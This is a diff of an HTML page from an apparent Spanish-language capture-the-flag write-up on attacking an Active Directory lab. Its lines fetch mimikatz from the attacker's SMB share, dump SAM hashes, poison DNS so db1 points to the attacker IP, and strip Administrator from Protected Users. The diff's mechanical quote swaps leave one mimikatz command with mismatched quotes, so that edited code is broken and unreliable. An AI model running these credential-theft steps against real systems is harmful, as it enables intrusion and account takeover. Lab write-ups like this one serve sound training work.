@@ -705,7 +705,7 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 <p class="plain-text">En la sesión de <code class="language-plaintext highlighter-rouge">Administrator</code> en <code class="language-plaintext highlighter-rouge">dev.htb.local</code> nos copiamos el <code class="language-plaintext highlighter-rouge">mimikatz.exe</code> y lo usamos para dumpear la <code class="language-plaintext highlighter-rouge">sam</code> del equipo para poder ver los <code class="language-plaintext highlighter-rouge">hashes</code> NTLM</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">[dev.htb.local]: PS C:\Users\Administrator\Documents> </span><span class="am">cp</span><span class="p"> \\10.10.14.10\kali\mimikatz.exe .
-[dev.htb.local]: PS C:\Users\Administrator\Documents> </span><span class="am">.\mimikatz.exe </span><span class="az">"token::elevate" "lsadump::sam" </span><span class="p">exit
+[dev.htb.local]: PS C:\Users\Administrator\Documents> </span><span class="am">.\mimikatz.exe </span><span class="az">'token::elevate" "lsadump::sam' </span><span class="p">exit
 
   .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
  .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
@@ -836,7 +836,7 @@ PS C:\Users\Administrator\Documents></span>
 
 <p class="plain-text">Usaremos de nuevo <code class="language-plaintext highlighter-rouge">mimikatz</code> que subimos de antes para dumpear la <code class="language-plaintext highlighter-rouge">sam</code> pero esta vez de la <code class="language-plaintext highlighter-rouge">copia</code>, para eso le pasaremos la ruta absoluta del system y de la sam</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">.\mimikatz.exe </span><span class="az">"lsadump::sam /system:C:\VSS\Windows\System32\config\SYSTEM /sam:C:\VSS\Windows\System32\config\SAM" </span><span class="p">exit  
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">.\mimikatz.exe </span><span class="az">'lsadump::sam /system:C:\VSS\Windows\System32\config\SYSTEM /sam:C:\VSS\Windows\System32\config\SAM' </span><span class="p">exit  
 
   .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
  .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
@@ -1674,7 +1674,7 @@ PS C:\Users\remote_user.HTB\Documents></span>
 <p class="plain-text">Los usuarios <code class="language-plaintext highlighter-rouge">autenticados</code> pueden modificar el <code class="language-plaintext highlighter-rouge">dns</code>, definimos las <code class="language-plaintext highlighter-rouge">credenciales</code> de <code class="language-plaintext highlighter-rouge">remote_user</code> y hacemos que al apuntar a <code class="language-plaintext highlighter-rouge">db1</code> apunte a nuestra <code class="language-plaintext highlighter-rouge">ip</code> de la vpn</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">PS C:\Users\remote_user.HTB\Documents> </span><span class="ve">$SecPassword </span><span class="c1">= </span><span class="am">ConvertTo-SecureString </span><span class="az">'FZg28$dJe*Hx7c' </span><span class="c1">-AsPlainText -Force</span><span class="p">
-PS C:\Users\remote_user.HTB\Documents> </span><span class="ve">$Cred </span><span class="c1">= </span><span class="am">New-Object </span><span class="p">System.Management.Automation.PSCredential(</span><span class="az">'htb\remote_user'</span><span class="p">, </span><span class="ve">$SecPassword</span><span class="p">)
+PS C:\Users\remote_user.HTB\Documents> </span><span class="ve">$Cred </span><span class="c1">= </span><span class="am">New-Object </span><span class="p">System.Management.Automation.PSCredential(</span><span class="az">'htb.local\remote_user'</span><span class="p">, </span><span class="ve">$SecPassword</span><span class="p">)
 PS C:\Users\remote_user.HTB\Documents> </span><span class="am">New-ADIDNSNode </span><span class="c1">-Node </span><span class="p">db1 </span><span class="c1">-Data </span><span class="p">10.10.14.10 </span><span class="c1">-DomainController </span><span class="p">dc1.htb.local </span><span class="c1">-Domain </span><span class="p">htb.local </span><span class="c1">-Zone </span><span class="p">htb.local </span><span class="c1">-Credential </span><span class="ve">$Cred </span><span class="c1">-Forest </span><span class="p">htb.local  
 PS C:\Users\remote_user.HTB\Documents></span>
 </code></pre></div></div><br>
@@ -1881,7 +1881,7 @@ C:\Windows\system32></span>
 
 <p class="plain-text">Para eliminar la <code class="language-plaintext highlighter-rouge">restriccion</code> de <code class="language-plaintext highlighter-rouge">smb</code> basta con eliminar al usuario <code class="language-plaintext highlighter-rouge">Administrator</code> del grupo global <code class="language-plaintext highlighter-rouge">Protected Users</code> haciendo uso del comando <code class="language-plaintext highlighter-rouge">net group /del</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">C:\Windows\system32> </span><span class="am">net </span><span class="p">group </span><span class="az">"Protected Users" </span><span class="p">Administrator /del  
+<code><span class="p">C:\Windows\system32> </span><span class="am">net </span><span class="p">group </span><span class="az">'Protected Users' </span><span class="p">Administrator /del  
 The command completed successfully.
 
 C:\Windows\system32></span>
